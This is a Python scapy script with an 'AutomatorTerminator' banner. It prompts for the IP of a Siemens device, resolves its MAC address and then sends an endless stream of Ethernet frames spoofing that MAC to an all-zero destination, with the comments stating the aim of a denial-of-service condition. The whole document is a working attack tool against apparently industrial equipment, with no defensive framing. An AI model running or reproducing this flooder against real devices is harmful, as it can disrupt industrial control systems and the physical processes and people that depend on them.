#!/usr/bin/python3

from scapy.all import *
from colorama import Fore, Back, Style
from subprocess import Popen, PIPE
from art import *
import threading
import subprocess
import time
import os
import sys
import re

# Banner

print(Fore.RED + r"""

 ▄▄▄· ▄• ▄▌▄▄▄▄▄      • ▌ ▄ ·.  ▄▄▄· ▄▄▄▄▄      ▄▄▄   
▐█ ▀█ █▪██▌•██  ▪     ·██ ▐███▪▐█ ▀█ •██  ▪     ▀▄ █· 
▄█▀▀█ █▌▐█▌ ▐█.▪ ▄█▀▄ ▐█ ▌▐▌▐█·▄█▀▀█  ▐█.▪ ▄█▀▄ ▐▀▀▄  
▐█ ▪▐▌▐█▄█▌ ▐█▌·▐█▌.▐▌██ ██▌▐█▌▐█ ▪▐▌ ▐█▌·▐█▌.▐▌▐█•█▌ 
 ▀  ▀  ▀▀▀  ▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀ ▀  ▀  ▀▀▀  ▀█▄▀▪.▀  ▀ 
▄▄▄▄▄▄▄▄ .▄▄▄  • ▌ ▄ ·. ▪   ▐ ▄  ▄▄▄· ▄▄▄▄▄      ▄▄▄  
•██  ▀▄.▀·▀▄ █··██ ▐███▪██ •█▌▐█▐█ ▀█ •██  ▪     ▀▄ █·
 ▐█.▪▐▀▀▪▄▐▀▀▄ ▐█ ▌▐▌▐█·▐█·▐█▐▐▌▄█▀▀█  ▐█.▪ ▄█▀▄ ▐▀▀▄ 
 ▐█▌·▐█▄▄▌▐█•█▌██ ██▌▐█▌▐█▌██▐█▌▐█ ▪▐▌ ▐█▌·▐█▌.▐▌▐█•█▌
 ▀▀▀  ▀▀▀ .▀  ▀▀▀  █▪▀▀▀▀▀▀▀▀ █▪ ▀  ▀  ▀▀▀  ▀█▄▀▪.▀  ▀
                """)

time.sleep(1.5)

# Get IP to exploit

IP = input("Enter the IP address of the Siemens device to exploit: ")

# Find the mac address of the device

Mac = getmacbyip(IP)

# Function to send the ouput to "nothing"

def NULL ():

    f = open(os.devnull, 'w')
    sys.stdout = f

# Eternal loop to produce DoS condition

def Arnold ():

    AutomatorTerminator = True

    while AutomatorTerminator == True:
        Packet = Ether()
        Packet.dst = "00:00:00:00:00:00"
        Packet.src = Mac
        sendp(Packet)
        NULL()
def Sarah ():

    AutomatorTerminator = True

    while AutomatorTerminator == True:
        Packet = Ether()
        Packet.dst = "00:00:00:00:00:00"
        Packet.src = Mac
        sendp(Packet)
        NULL()
def Kyle ():
    AutomatorTerminator = True

    while AutomatorTerminator == True:
        Packet = Ether()
        Packet.dst = "00:00:00:00:00:00"
        Packet.src = Mac
        sendp(Packet)
        NULL()

# Arnold
ArnoldThread = threading.Thread(target=Arnold)
ArnoldThread.start()
ArnoldThread.join()
NULL()

# Sarah

SarahThread = threading.Thread(target=Sarah)
SarahThread.start()
SarahThread.join()
NULL()

# Kyle

KyleThread = threading.Thread(target=Kyle)
KyleThread.start()
KyleThread.join()
NULL()


